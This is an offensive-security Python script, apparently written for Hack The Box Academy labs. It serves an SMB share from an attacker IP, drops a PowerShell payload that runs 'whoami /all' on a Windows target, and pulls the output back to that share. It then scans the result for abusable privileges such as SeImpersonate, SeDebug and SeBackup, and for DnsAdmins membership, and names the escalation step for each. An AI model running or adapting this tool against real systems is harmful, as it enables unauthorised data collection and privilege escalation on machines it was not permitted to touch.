# This example enumerates privileges
# Tested on HTB Academy

from payload import CRunPowershellExe
from tempsmbserver import TempSMB


local_ip = "10.10.16.101"

with TempSMB(local_ip=local_ip, set_credentials=False, smb2=False) as smb:
    output_file = smb.future_file(ext=".out")
    enumeration_file = smb.create_temp_file(f"whoami.exe /all > {output_file.remote_path}", ext=".ps1")
    enumeration_exe = CRunPowershellExe(smb, [enumeration_file])


    print(f"{"="*10}ANGRY SMB READY{"="*10}")
    print(enumeration_exe.file.remote_path)
    print(f"{"="*10}waiting{"="*10}")
    output_file.await_me()
    output_file.print(True)

    rights_dictionary = {"SeImpersonatePrivilege": "Use seimpersonate", "SeDebugPrivilege": "Use sedebug", "SeTakeOwnershipPrivilege": "NOT IMPLEMENTED", "SeBackupPrivilege": "Use sebackup"}
    privilege_state = ["Disabled", "Enabled"]
    # USE SIDS HERE BECAUSE OTHER LANGUAGES!!
    groups_dictionary = {"DnsAdmins": "User dnsadmin"}

    for line in output_file.string().split("\n"):
        line = line.lower()
        for right, next_step in rights_dictionary.items():
            if right.lower() in line:
                for state in privilege_state:
                    if state.lower() in line:
                        print(f"{right} is {state}!")
                        if state.lower() == "disabled":
                            print(f"Enabled {right}")
                        print(next_step)
                        continue
        for group, next_step in groups_dictionary.items():
            if group.lower() in line:
                print(f"{group} membership found!")
                print(next_step)
                continue
